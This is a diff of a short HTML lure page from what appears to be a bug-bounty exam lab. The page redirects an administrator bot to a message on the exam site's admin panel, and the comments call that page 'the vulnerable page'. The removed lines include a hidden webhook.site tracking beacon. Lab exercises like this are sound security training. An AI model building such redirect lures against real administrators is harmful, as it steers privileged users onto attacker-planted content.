@@ -1,28 +1,23 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Support Ticket Redirect</title>
+    <title>Admin Portal Redirect</title>
 </head>
 <body>
-    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-        <h2>Loading Internal Support Portal...</h2>
-        <p>Please wait while we retrieve the ticket data.</p>
+    <div style="font-family: sans-serif; text-align: center; margin-top: 100px;">
+        <h1>Redirecting to Admin Dashboard...</h1>
+        <p>Please wait while we authenticate your session.</p>
     </div>
 
-    <img src="https://webhook.site/4f76b790-cb50-4939-8cc1-b60d30b71915?step=html_file_loaded" style="display:none">
-
     <script>
-        // The specific message ID you generated
-        const targetId = "69e7691fbee6d6b7c6641e0b";
+        // REPLACE THIS ID with the one you got from the POST response
+        const messageId = "69e7691fbee6d6b7c6641e0b"; 
         
-        // The internal admin path for the car rental dashboard
-        const adminPath = "https://bugbounty-exam.hashacademy.co/admin/messages/" + targetId;
+        // The path where the admin bot views messages
+        const targetUrl = "https://bugbounty-exam.hashacademy.co/admin/messages/" + messageId;
 
-        // Redirect the bot to the vulnerable page after a short delay
-        setTimeout(() => {
-            window.location.href = adminPath;
-        }, 500);
+        // Force the bot to go to the message
+        window.location.href = targetUrl;
     </script>
 </body>
 </html>
